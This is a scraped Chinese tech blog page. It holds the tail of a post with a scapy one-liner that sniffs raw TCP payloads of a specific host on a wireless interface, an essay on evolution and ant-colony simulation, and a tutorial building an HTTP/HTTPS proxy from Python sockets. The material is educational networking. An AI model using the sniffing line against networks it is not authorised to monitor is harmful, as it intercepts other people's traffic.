<p> pkts = sniff(filter=”tcp and host 192.168.1.102”,iface=”wlan0”, prn=lambda x: sprintf(“{IP:%IP.src% -&gt; %IP.dst%\n}{Raw:%Raw.load%\n}”))</p>
</li>
<li><p>check it</p>
</li>
</ol>
<h2 id="Footnotes">Footnotes</h2>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/02/18/" itemprop="url">
                  生命游戏
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-02-18T00:00:00+08:00" content="2014-02-18">
              2014-02-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/02/18/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/02/18//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Warning: 满篇的信口雌黄，请勿认真。</p>
<blockquote>
<p>温度计说，零下25度，天气预报说，北部寒潮，东部暴雨，南方大风，经验说，路面很滑，坡度表说，这太陡了，而你说，感谢这一切….</p>
</blockquote>
<p>从小就对生物感兴趣，好奇毫无生气的元素如何如何就造就了栩栩如生丰富多彩的世界。然而时光飞逝，渐渐来到这里，每日敲着代码。在森林中彷徨着，抬头看不到日月星辰，走起来分不清东南西北。</p>
<p>从家里离开的那天前一晚，看了CCTV记录频道一档励志片——人猿星球。讲述了两个人科动物的爱恨情仇，刀光剑影。</p>
<p>人高马大，身体健壮，皮肤白皙的尼安德特人灭绝了，这群高富帅属性符合多少女性审美趣味的原始人类永远消失在地球之上。矮搓穷们的非洲智人则取代他们，成为地球的主宰。</p>
<p>太他妈励志了。</p>
<p>励志片说智人发明了针，于是尼安德特人灭绝了。</p>
<p>励志片说智人产生了男女分工甚至社会分工，于是尼安德特人灭绝了。</p>
<p>励志片说智人更容易说话，于是尼安德特人灭绝了。</p>
<p>励志片说尼安德特人需要的食物更多，于是他们灭绝了。</p>
<p>智人们说，团结就是力量，于是尼安德特人灭绝了。</p>
<p>其实总结起来就是，社会化的智人在这个星球上有更强大的生存能力。所以，有了现在的我们。</p>
<p>又想起了另一档励志片。叫做《远古生物大灭绝》，我看的那集讲了主宰地球两亿年的恐龙如何被一颗飞来横祸的小行星给祸害的故事。也是一群地下穴居哺乳动物如何逆袭成为世界主流的故事。</p>
<p>一颗小行星，一个偶发事件，改变了生物生存的环境，也因此改变了进化的轨迹。生物有多脆弱，再强大的生物在自然的变化前也难逃厄运。</p>
<p>小行星撞击地球对哺乳动物是个机遇。从前作为恐龙的食物他们被迫转入地下，存储食物。结果，虽然死亡率很高，它们没有灭绝。在黎明前的黑暗之后，便迎来了哺乳动物的时代。</p>
<p>想想启示吧，生存下来是第一要务，人应该锻炼更有利于生存的技能，否则在社会竞争下等待的只有被选择淘汰的命运。</p>
<p>困难的时候就等等机遇吧，等个两亿年说不定世界就变了。世界变了，习惯困难的倒霉孩子也会很倒霉，但有些人会更倒霉。</p>
<p>这时候不得不说说我最爱看的电视节目：动物世界</p>
<p>管他是什么动物，看着生物们使出浑身解数，各施绝技，你就感觉这世界太他妈精彩了，可能性太他妈多了。好像忽然明白生命不只是只有一条路而是存在无数可能。</p>
<p>我从前一直觉得捕食者好像很舒服似的，被捕食者真是倒了霉的。后来才知道捕食者的日子也难过的一比。一次捕食失败就会沉重打击一个捕食者，也许它就此被淘汰出局。食物链越上层的动物越是脆弱，因为它越是依赖下层的支持和供应。嗯，懂我在说什么吧。</p>
<p>生命就像场游戏，你不会见到比这更迷人更丰富的游戏了。你不得不玩这个游戏。</p>
<p>没倒下就坚持到最后。</p>
<p>最后谈谈正题，谈谈蚂蚁。</p>
<p>我所崇拜的黑客、物理学家、无线电修理者、保险柜密码破解高手、艺术家、舞蹈爱好者、手鼓演奏者和玛雅象形文字的破译者费曼曾经在他的书中描述过某个的午后，他是怎么和蚂蚁有个约会玩的上了瘾。费曼探索出蚂蚁找寻食物的原理，它们通过信息素/气味进行通信，标识食物和窝的路径。</p>
<p>1992年，著名的蚁群算法诞生了。</p>
<p>我第一次看到“蚁群算法”是在江南大学的图书馆里某本书，立即被这个神奇的过程吸引了，然而想起来动手试试，竟然是多少年之后的事。</p>
<p>更奇葩的是，竟然照着百度百科来的……</p>
<p>蚂蚁很萌的，你们不要黑它。</p>
<p>它们的世界很小，身边<code>3x3</code>的世界，它们只是蚁群蚂蚁中微不足道的一部分。</p>
<p>蚂蚁说，我从何处来，将往哪里去呢？</p>
<p>蚂蚁们有两个状态，有的寻找食物，有的寻找蚂蚁洞。</p>
<p>可怜的蚂蚁。</p>
<p>但是它们竟然找到一条近乎最短的到食物的路径，来回往复，How？</p>
<p>我抓了一只萌蚂蚁问她</p>
<p>蚂蚁说，我们通过气味来交流</p>
<p>蚂蚁说，当我发现食物时，就开始留下气味，离食物越远，我留下的气味越小。</p>
<p>蚂蚁说, 随着时间流逝，我留下的气味慢慢挥发。</p>
<p>蚂蚁说，我这样做决定：</p>
<ol>
<li>如果我的四周哪个地方信息素越高，那里有我寻找的东西的几率就大，我就往哪里去。</li>
<li>但是我不走回头路，我会记住曾走过的一部分路，并且尽量避免再走一遍</li>
<li>蚂蚁说，当我找到什么时我就回头寻找回去的路。</li>
</ol>
<p>于是我放了一些食物和一群蚂蚁，看看它们能不能找到窝，我想它们可以找到。</p>
<p>虽然一个只能朝八个方向运动的蚂蚁是这么不完美, 最短路径也是这么不完美。</p>
<p>but, it works…</p>
<p>我得找个地方放视频。干脆用gimp转成gif算了……不知道matplotlib能不能做这个……懒得看了</p>
<p><img src="/images/ants/animate.gif" alt="蚁群算法模拟"></p>
<p>made by matplotlib</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2014/01/29/python/" itemprop="url">
                  用python写一个http代(和谐)理
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-01-29T00:00:00+08:00" content="2014-01-29">
              2014-01-29
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2014/01/29/python/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2014/01/29/python/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>简单展示和学习，清晰为主，不考虑效率。</p>
<p>本文简单讨论支持GET/CONNECT方法的http代理。这两种可能是最常用的方法。GET请求用于大多数http请求，CONNECT请求负责处理https。</p>
<p>为了更加明晰，也没有使用requests或者httplib等其它模块，没有使用SocketServer和它的子类，因为我个人觉得从socket开始能有个更加清晰的理解。</p>
<p>看着玩吧。</p>
<p>如果真的要用一个Proxy，我会直接使用pytho中的twisted或者BaseHTTPServer，或者基于nodejs的。它们有着更好的设计和更高层次的抽象，当然，更全面的特性和更稳定、更高的性能。文末将给出相关资料与实现。</p>
<p>请准备好一台linux系统，安装好netcat, openssl和python解释器。目前我用的还是2.7。</p>
<h2 id="基本原理">基本原理</h2><h3 id="客户服务器模型">客户服务器模型</h3><p>首要问题是：客户服务器之间如何通信。简单说来就是客户端发送请求，告诉服务器我要什么东西，服务器则告诉客户端想要的东西或者告诉客户端找不到。</p>
<p>首先，客户端比如你的浏览器要找到服务器，通常的做法是在浏览器地址栏输入你想寻找的服务器。至于怎么寻找，如何最后在你的客户端和服务器间建立连接这点不细说。总之最后的结果是，两者之间建立了一条可以互相通话的专有线路，就像两个打电话的人一样，电话已经接通。</p>
<p>接着，你的浏览器说，我想要什么什么东西，有什么什么要求。电话另一头的服务器听到后就回复它有没有什么东西，如果有返回个什么样的东西，然后把东西传给你的浏览器。</p>
<p>接受到从服务器传来的数据后，浏览器把一堆你看不懂的东西绘制到屏幕上，绘声绘色地显示给你。</p>
<p>就这么简单。详情请参考RFC 2616，这是第一手最好的资料。</p>
<p>下面让我么实际看看他们都怎么通话的</p>
<p>我们先看看不用代理时，浏览器向服务器发送了些什么。监听本地8888端口</p>
<pre><code> ~ ⮀ nc -lvp <span class="number">8888</span>
listening on [any] <span class="number">8888</span> ...
connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] from localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">56499</span>
GET /index.html?haha=<span class="number">1</span>&amp;papa=<span class="number">2</span> HTTP/<span class="number">1.1</span> Host: localhost:<span class="number">8888</span> User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">24.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">24.0</span>
Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie:  __utma=<span class="label">XXXXXXXXXXXXXXXXXXXXXXXXXx; __utmz=111x7x2x1.13x86x7x41.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)</span>
Connection: keep-alive</span>
</code></pre><p>忽略无关紧要的细节，这就是传说中的HTTP头。注意，最后还得有个空行表示我说完了。它告诉服务器以下一些信息：</p>
<ul>
<li>浏览器想做什么(<code>GET</code>)</li>
<li>想要什么(<code>index.html?haha=1&amp;papa=2</code>)</li>
<li>说的什么版本的什么话(<code>HTTP/1.1</code>)</li>
<li>要的东西在哪里(<code>Host</code>)</li>
<li>浏览器的一些特征(<code>User-Agent:</code>)</li>
<li>浏览器接收什么样的东西(<code>Accept</code>)</li>
<li>浏览器可以接受什么样的人类语言(<code>Accept-Language</code>)</li>
<li>浏览器能处理的压缩或编码方式(<code>Accept-Encoding</code>)</li>
<li>其它信息(标识浏览器身份的<code>Cookie</code>和在通话完成后是否把电话挂掉的信息<code>Connection</code>)</li>
</ul>
<p>对于特定版本的HTTP协议1.1，除了前两行是必要的其它都是可选的。</p>
<p>我们再看看服务器返回的信息是啥样的。</p>
<pre><code> ~ ⮀ nc baidu.com 80
GET / HTTP/1.1
Host: baidu.com

HTTP/1.1 200 OK
Date: Mon, 03 Feb 2014 07:37:46 GMT
Server: Apache
<span class="operator"><span class="keyword">Cache</span>-Control: <span class="keyword">max</span>-age=<span class="number">86400</span>
Expires: Tue, <span class="number">04</span> Feb <span class="number">2014</span> <span class="number">07</span>:<span class="number">37</span>:<span class="number">46</span> GMT
<span class="keyword">Last</span>-Modified: Tue, <span class="number">12</span> Jan <span class="number">2010</span> <span class="number">13</span>:<span class="number">48</span>:<span class="number">00</span> GMT
ETag: <span class="string">"51-4b4c7d90"</span>
<span class="keyword">Accept</span>-Ranges: <span class="keyword">bytes</span>
<span class="keyword">Content</span>-<span class="keyword">Length</span>: <span class="number">81</span>
<span class="keyword">Connection</span>: <span class="keyword">Keep</span>-Alive
<span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/html

&lt;html&gt;
&lt;meta <span class="keyword">http</span>-equiv=<span class="string">"refresh"</span> <span class="keyword">content</span>=<span class="string">"0;url=http://www.baidu.com/"</span>&gt;
&lt;/html&gt;</span>
</code></pre><p>服务器返回了这些信息：</p>
<ul>
<li>服务器端用什么版本的什么话通信(<code>HTTP/1.1</code>)</li>
<li>浏览器请求的资源是否可获得(<code>200 OK</code>)</li>
<li>还有其它细节用来表示时间，它的情况，浏览器应该怎么做，传送的消息是什么等等。</li>
</ul>
<p>这就是传说中的HTTP响应头。一个空行之后是实际传送的数据。嗯，这里就是浏览器喜欢的html文本文件。浏览器接收后会将其解析渲染或执行对应操作。</p>
<p>嗯基本原理就是这样。</p>
<h2 id="连接的建立">连接的建立</h2><p>当我们谈互联网时，不得不说说什么是socket。</p>
<p>当然，还得知道互联网的分层架构。</p>
<p>然而暂时不要管什么是socket，反正它就存在在那里，整个互联网建立在socket通信之上，包括Unix系统的内部通信。</p>
<p>可以把它设想成一个通信管道或线路的入口。如何使用它呢？拿python示例：</p>
<pre><code>import <span class="built_in">socket</span>
soc = <span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET, <span class="built_in">socket</span>.SOCK_STREAM)
</code></pre><p>我们先导入socket模块，然后建立了一种指定类型的socket，嗯，这里是支持IPv4上TCP连接的socket。</p>
<p>一个服务器应该这样，要先绑定，然后监听：</p>
<pre><code>soc.<span class="function"><span class="title">bind</span><span class="params">(<span class="string">""</span>, <span class="number">8888</span>)</span></span>
new_soc, <span class="tag">address</span> = soc.<span class="function"><span class="title">accept</span><span class="params">()</span></span>
new_soc.<span class="function"><span class="title">recv</span><span class="params">(<span class="number">1024</span>)</span></span>
</code></pre><p>以上将socket绑定到本地(<code>&quot;&quot;</code>)的8888端口。这样，所有连接到本机8888端口的连接实际上都是通过这个socket连接了。</p>
<p>接着，开始监听，一旦有客户端连接本机8888端口，就返回它的地址(address)和一个新的socket。注意，服务器端socket并不进行通信，只监听连接并生成一个新的用来连接的socket。然后，可以通过这个新的socket和客户端通信。</p>
<p>客户端则比较简单：</p>
<pre><code>soc.connect(localhost, <span class="number">8888</span>)
soc.send(<span class="string">"<span class="keyword">GET</span> / HTTP/1.1\r\nHost: baidu.com\r\n\r\n"</span>)
</code></pre><p>连接某个机器的某个端口后则可以通过socket进行通信</p>
<h3 id="代理服务器">代理服务器</h3><p>代理服务器，是服务器和客户端之间一个中间站。将客户端发送的请求转发给服务器，将服务器的响应转发给客户端。</p>
<p>当我们说到代理服务器，首先它是一个服务器。</p>
<p>有了上面的基础可以写出以下代码，更多细节参考Python的socket文档：</p>
<pre><code>import <span class="keyword">socket</span>
soc.<span class="keyword">bind</span>(<span class="string">""</span>, <span class="number">8888</span>)
<span class="keyword">while</span> True:
    <span class="comment"># 监听接入的连接</span>
    new_soc, address = soc.<span class="keyword">accept</span>()
    <span class="comment"># 从socket读取数据</span>
    data = new_soc.<span class="keyword">recv</span>(<span class="number">1024</span>)
    <span class="comment"># 向socket发送数据</span>
    new_soc.<span class="keyword">send</span>(data)
</code></pre><p>其次它是一个客户端，它要向服务器请求数据。</p>
<p>其次它是个web服务器，尽管它大部分数据只需要转发。但它应该能处理HTTP协议，只是不必什么都处理。下面将展示有哪些地方在转发时必须处理。</p>
<h3 id="火狐在使用代理时的HTTP头">火狐在使用代理时的HTTP头</h3><p>与不使用代理时有什么不同呢？</p>
<pre><code>~ ⮀ nc -lvp <span class="number">8000</span>
listening on [any] <span class="number">8000</span> ...
connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] from localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">60601</span>
GET http:<span class="comment">//baidu.com/ HTTP/1.1</span>
Host: baidu.com
User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">24.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">24.0</span>
Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: BAIDUID=×××××××××××××××:FG=1; BDUSS=<span class="label">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; bid_1=XXXXXXXXXXXXXXXXXXX; MCITY=-XXXXXXXXX%3A</span>
Connection: keep-alive</span>
</code></pre><p>注意没，GET后面不是请求的文件的路径，而是整个URI。那么我们的代理服务器得把浏览器的请求改成路径再转发。</p>
<p>其次，我们不希望再转发给baidu.com的服务器之后服务器不断开连接而一直保持，我们希望它赶紧断开连接好让我们能干点其它事。</p>
<pre><code><span class="attribute">Connection</span>: <span class="string">close</span>
</code></pre><p>综上，一个简单的能处理GET请求的代理服务器应该能做到：</p>
<ul>
<li>将浏览器请求的第一行中完整的URL(<a href="http://baidu.com/)替换成路径(&#39;/&#39;)，通常情况下，没有指定资源文件的情况下默认是`/index.html`。" target="_blank" rel="external">http://baidu.com/)替换成路径(&#39;/&#39;)，通常情况下，没有指定资源文件的情况下默认是`/index.html`。</a></li>
<li>将HTTP头中的Connection设置为close。</li>
</ul>
<p>基本原理就是这样，嗯，多简单。</p>
<h2 id="实现代(和谐)理">实现代(和谐)理</h2><p>我们可以先写点什么验证我们的想法，</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># -*- coding: utf-8 -*-</span>

<span class="keyword">import</span> socket
<span class="keyword">import</span> urlparse

HOST = <span class="string">''</span>                 <span class="comment"># Symbolic name meaning all available interfaces</span>
PORT = <span class="number">8000</span>              <span class="comment"># Arbitrary non-privileged port</span>


<span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(host, port)</span>:</span>
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)
    s.bind((host, port))
    s.listen(<span class="number">500</span>)
    <span class="keyword">print</span> <span class="string">"Serving at %s"</span> % PORT
    <span class="keyword">while</span> <span class="number">1</span>:
        <span class="keyword">try</span>:
            conn, addr = s.accept()
            handle_connection(conn)
        <span class="keyword">except</span> KeyboardInterrupt:
            <span class="keyword">print</span> <span class="string">"Bye..."</span>
            <span class="keyword">break</span>


<span class="function"><span class="keyword">def</span> <span class="title">getline</span><span class="params">(conn)</span>:</span>
    line = <span class="string">''</span>
    <span class="keyword">while</span> <span class="number">1</span>:
        buf = conn.recv(<span class="number">1</span>)
        <span class="keyword">if</span> buf == <span class="string">'\r'</span>:
            line += buf
            buf = conn.recv(<span class="number">1</span>)
            <span class="keyword">if</span> buf == <span class="string">'\n'</span>:
                line += buf
                <span class="keyword">return</span> line
        <span class="comment"># elif buf == '':</span>
        <span class="comment">#     return</span>
        <span class="keyword">else</span>:
            line += buf


<span class="function"><span class="keyword">def</span> <span class="title">get_header</span><span class="params">(conn)</span>:</span>
    <span class="string">'''
    不包括\r\n
    '''</span>
    headers = <span class="string">''</span>
    <span class="keyword">while</span> <span class="number">1</span>:
        line = getline(conn)
        <span class="keyword">if</span> line <span class="keyword">is</span> <span class="keyword">None</span>:
            <span class="keyword">break</span>
        <span class="keyword">if</span> line == <span class="string">'\r\n'</span>:
            <span class="keyword">break</span>
        <span class="keyword">else</span>:
            headers += line
    <span class="keyword">return</span> headers


<span class="function"><span class="keyword">def</span> <span class="title">parse_header</span><span class="params">(raw_headers)</span>:</span>
    request_lines = raw_headers.split(<span class="string">'\r\n'</span>)
    first_line = request_lines[<span class="number">0</span>].split(<span class="string">' '</span>)
    method = first_line[<span class="number">0</span>]
    full_path = first_line[<span class="number">1</span>]
    version = first_line[<span class="number">2</span>]
    <span class="keyword">print</span> <span class="string">"%s %s"</span> % (method, full_path)
    (scm, netloc, path, params, query, fragment) \
        = urlparse.urlparse(full_path, <span class="string">'http'</span>)
    <span class="comment"># 如果url中有‘：’就指定端口，没有则为默认80端口</span>
    i = netloc.find(<span class="string">':'</span>)
    <span class="keyword">if</span> i &gt;= <span class="number">0</span>:
        address = netloc[:i], int(netloc[i + <span class="number">1</span>:])
    <span class="keyword">else</span>:
        address = netloc, <span class="number">80</span>
    <span class="keyword">return</span> method, version, scm, address, path, params, query, fragment


<span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(conn)</span>:</span>
    <span class="comment"># 从socket读取头</span>
    req_headers = get_header(conn)
    <span class="comment"># 更改HTTP头</span>
    <span class="comment">## 要没有HTTP头的话。。。</span>
    <span class="keyword">if</span> req_headers <span class="keyword">is</span> <span class="keyword">None</span>:
        <span class="keyword">return</span>
    method, version, scm, address, path, params, query, fragment = \
        parse_header(req_headers)
    path = urlparse.urlunparse((<span class="string">""</span>, <span class="string">""</span>, path, params, query, <span class="string">""</span>))
    req_headers = <span class="string">" "</span>.join([method, path, version]) + <span class="string">"\r\n"</span> +\
        <span class="string">"\r\n"</span>.join(req_headers.split(<span class="string">'\r\n'</span>)[<span class="number">1</span>:])
    <span class="comment"># 建立socket用以连接URL指定的机器</span>
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="comment"># soc.settimeout(1)</span>
    <span class="comment"># 尝试连接</span>
    <span class="keyword">try</span>:
        soc.connect(address)
    <span class="keyword">except</span> socket.error, arg:
        conn.sendall(<span class="string">"HTTP/1.1"</span> + str(arg[<span class="number">0</span>]) + <span class="string">" Fail\r\n\r\n"</span>)
        conn.close()
        soc.close()
    <span class="keyword">else</span>:  <span class="comment"># 若连接成功</span>
        <span class="comment"># 把HTTP头中连接设置为中断</span>
        <span class="comment"># 如果不想让火狐卡在那里不继续加载的话</span>
        <span class="keyword">if</span> req_headers.find(<span class="string">'Connection'</span>) &gt;= <span class="number">0</span>:
            req_headers = req_headers.replace(<span class="string">'keep-alive'</span>, <span class="string">'close'</span>)
        <span class="keyword">else</span>:
            req_headers += req_headers + <span class="string">'Connection: close\r\n'</span>
        <span class="comment"># 发送形如`GET path/params/query HTTP/1.1`</span>
        <span class="comment"># 结束HTTP头</span>
        req_headers += <span class="string">'\r\n'</span>
        soc.sendall(req_headers)
        <span class="comment"># 发送完毕, 接下来从soc读取服务器的回复</span>
        <span class="comment"># 建立个缓冲区</span>
        data = <span class="string">''</span>
        <span class="keyword">while</span> <span class="number">1</span>:
            <span class="keyword">try</span>:
                buf = soc.recv(<span class="number">8129</span>)
                data += buf
            <span class="keyword">except</span>:
                buf = <span class="keyword">None</span>
            <span class="keyword">finally</span>:
                <span class="keyword">if</span> <span class="keyword">not</span> buf:
                    soc.close()
                    <span class="keyword">break</span>
        <span class="comment"># 转发给客户端</span>
        conn.sendall(data)
        conn.close()
<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
    server(HOST, PORT)
</code></pre><p>运行它并且将浏览器设置为使用该代理：</p>
<pre><code><span class="keyword">python</span> socket-proxy.<span class="keyword">py</span>
</code></pre><p>在本地建立一个web服务器实验：</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/proxy/</span>base_python ⮀ python -m SimpleHTTPServer <span class="number">8888</span> 
</code></pre><p>在浏览器中访问<code>http://localhost:8888</code>,成功列出当前目录。</p>
<p>你可以直接访问任何网站看看。渐渐会发现，我们的代理服务器虽然运行基本良好，一次却只能接受一个请求？非常低效。程序经常会阻塞在socket的读写上。</p>
<p>目前来说，提高效率有三种途径：</p>
<ul>
<li>异步I/O</li>
<li>线程</li>
<li>进程</li>
</ul>
<p>然而，本文暂不讨论如何提高效率。也许下回或某天会专门说说。我们接着再谈谈CONNECT代理实现原理。</p>
<h2 id="可进行https连接的http代理">可进行https连接的http代理</h2><p>https是建立在SSL/TLS上的安全连接，不要在意它是什么，我们只谈及它做什么。</p>
<p>通过SSL/TLS建立点与点之间的连接不被窃听。我们要为https连接代理的话，代理服务器就只能帮助客户端和服务器建立一条安全的加密通道，然后仅仅将数据中转。由于是加密的数据流，代理服务器并不能理解是什么，只看到一堆加密后的字符。</p>
<p>HTTP协议规定了一种CONNECT方法，用来向服务器申请这种中转。具体过程我们可以自己试着访问<code>https://google.com</code>看看，首先将浏览器代理设置为本地8000端口:</p>
<pre><code>~ ⮀ nc -lvp <span class="number">8000</span>
listening on [any] <span class="number">8000</span> ...
connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] from localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">43263</span>
CONNECT google.com:<span class="number">443</span> HTTP/<span class="number">1.1</span>
User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">24.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">24.0</span>
Proxy-Connection: keep-alive
Connection: keep-alive
Host: google.com

<span class="number">200</span> OK
��R����^��<span class="number">4</span>G��&gt;�&lt;�N�R���D1kVg|X�lH��
���<span class="number">98</span>���<span class="number">5</span>�      ���ED32��
���                      ���A/��
-
google.com
▒
 <span class="preprocessor">#<span class="number">3</span>t</span>
</code></pre><p>我们可以看到</p>
<ul>
<li>客户端向代理服务器申请代理(<code>CONNECT google.com:443 HTTP/1.1</code>)</li>
<li>代理服务器向客户端应答表示可以代理(<code>200 OK</code>)</li>
<li>客户端开始发送数据，准备建立加密信道</li>
</ul>
<p>剩下的工作应该由代理服务器继续。</p>
<ul>
<li>代理服务器建立一条与服务器的socket连接，</li>
<li>代理服务器在服务器和客户端之间转发数据。</li>
</ul>
<p>我们简单更改之前的简单脚本使之支持CONNECT（毫无设计的脚本风格写法……见笑）：</p>
<pre><code><span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(conn)</span>:</span>
    <span class="comment"># 从socket读取头</span>
    req_headers = get_header(conn)
    <span class="comment"># 更改HTTP头</span>
    <span class="comment">## 要没有HTTP头的话。。。</span>
    <span class="keyword">if</span> req_headers <span class="keyword">is</span> <span class="keyword">None</span>:
        <span class="keyword">return</span>
    method, version, scm, address, path, params, query, fragment = \
        parse_header(req_headers)
    <span class="keyword">if</span> method == <span class="string">'GET'</span>:
        do_GET(conn,
               req_headers,
               address,
               path,
               params,
               query,
               method,
               version)
    <span class="keyword">elif</span> method == <span class="string">'CONNECT'</span>:
        <span class="comment"># 注意</span>
        address = (path.split(<span class="string">':'</span>)[<span class="number">0</span>], int(path.split(<span class="string">':'</span>)[<span class="number">1</span>]))
        do_CONNECT(conn,
                   req_headers,
                   address)


<span class="function"><span class="keyword">def</span> <span class="title">do_CONNECT</span><span class="params">(conn, req_headers, address)</span>:</span>
    <span class="comment"># 建立socket用以连接URL指定的机器</span>
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="comment"># soc.settimeout(4)</span>
    <span class="comment"># 尝试连接</span>
    <span class="keyword">try</span>:
        soc.connect(address)
    <span class="keyword">except</span> socket.error, arg:
        conn.sendall(<span class="string">"/1.1"</span> + str(arg[<span class="number">0</span>]) + <span class="string">" Fail\r\n\r\n"</span>)
        conn.close()
        soc.close()
    <span class="keyword">else</span>:  <span class="comment"># 若连接成功</span>
        conn.sendall(<span class="string">'HTTP/1.1 200 Connection established\r\n\r\n'</span>)
        <span class="comment"># 数据缓冲区</span>
        <span class="comment"># 读取浏览器给出的消息</span>
        <span class="keyword">try</span>:
            <span class="keyword">while</span> <span class="keyword">True</span>:
                <span class="comment"># 从客户端读取数据，并转发给conn</span>
                data = conn.recv(<span class="number">99999</span>)
                soc.sendall(data)
                <span class="comment"># 从服务器读取回复，转发回客户端</span>
                data = soc.recv(<span class="number">999999</span>)
                conn.sendall(data)
        <span class="keyword">except</span>:
            conn.close()
            soc.close()


<span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(conn, req_headers, address, path, params, query, method, version)</span>:</span>
    path = urlparse.urlunparse((<span class="string">""</span>, <span class="string">""</span>, path, params, query, <span class="string">""</span>))
    req_headers = <span class="string">" "</span>.join([method, path, version]) + <span class="string">"\r\n"</span> +\
        <span class="string">"\r\n"</span>.join(req_headers.split(<span class="string">'\r\n'</span>)[<span class="number">1</span>:])
    <span class="comment"># 建立socket用以连接URL指定的机器</span>
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="comment"># soc.settimeout(1)</span>
    <span class="comment"># 尝试连接</span>
    <span class="keyword">try</span>:
        soc.connect(address)
    <span class="keyword">except</span> socket.error, arg:
        conn.sendall(<span class="string">"HTTP/1.1"</span> + str(arg[<span class="number">0</span>]) + <span class="string">" Fail\r\n\r\n"</span>)
        conn.close()
        soc.close()
    <span class="keyword">else</span>:  <span class="comment"># 若连接成功</span>
        <span class="comment"># 把HTTP头中连接设置为中断</span>
        <span class="comment"># 如果不想让火狐卡在那里不继续加载的话</span>
        <span class="keyword">if</span> req_headers.find(<span class="string">'Connection'</span>) &gt;= <span class="number">0</span>:
            req_headers = req_headers.replace(<span class="string">'keep-alive'</span>, <span class="string">'close'</span>)
        <span class="keyword">else</span>:
            req_headers += req_headers + <span class="string">'Connection: close\r\n'</span>
        <span class="comment"># 发送形如`GET path/params/query HTTP/1.1`</span>
        <span class="comment"># 结束HTTP头</span>
        req_headers += <span class="string">'\r\n'</span>
        soc.sendall(req_headers)
        <span class="comment"># 发送完毕, 接下来从soc读取服务器的回复</span>
        <span class="comment"># 建立个缓冲区</span>
        data = <span class="string">''</span>
        <span class="keyword">while</span> <span class="number">1</span>:
            <span class="keyword">try</span>:
                buf = soc.recv(<span class="number">8129</span>)
                data += buf
            <span class="keyword">except</span>:
                buf = <span class="keyword">None</span>
            <span class="keyword">finally</span>:
                <span class="keyword">if</span> <span class="keyword">not</span> buf:
                    soc.close()
